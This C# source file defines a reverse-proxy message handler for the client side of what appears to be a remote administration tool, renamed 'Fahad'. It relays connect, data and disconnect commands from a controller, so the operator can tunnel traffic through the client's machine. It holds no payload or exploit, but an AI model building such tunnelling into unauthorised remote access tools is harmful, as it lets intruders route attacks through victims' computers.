using Fahad.Client.Networking;
using Fahad.Client.ReverseProxy;
using Fahad.Common.Messages;
using Fahad.Common.Messages.ReverseProxy;
using Fahad.Common.Networking;

namespace Fahad.Client.Messages
{
    public class ReverseProxyHandler : IMessageProcessor
    {
        private readonly FahadClient _client;

        public ReverseProxyHandler(FahadClient client)
        {
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is ReverseProxyConnect ||
                                                             message is ReverseProxyData ||
                                                             message is ReverseProxyDisconnect;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ReverseProxyConnect msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyData msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyDisconnect msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, ReverseProxyConnect message)
        {
            _client.ConnectReverseProxy(message);
        }

        private void Execute(ISender client, ReverseProxyData message)
        {
            ReverseProxyClient proxyClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            proxyClient?.SendToTargetServer(message.Data);
        }
        private void Execute(ISender client, ReverseProxyDisconnect message)
        {
            ReverseProxyClient socksClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            socksClient?.Disconnect();
        }
    }
}
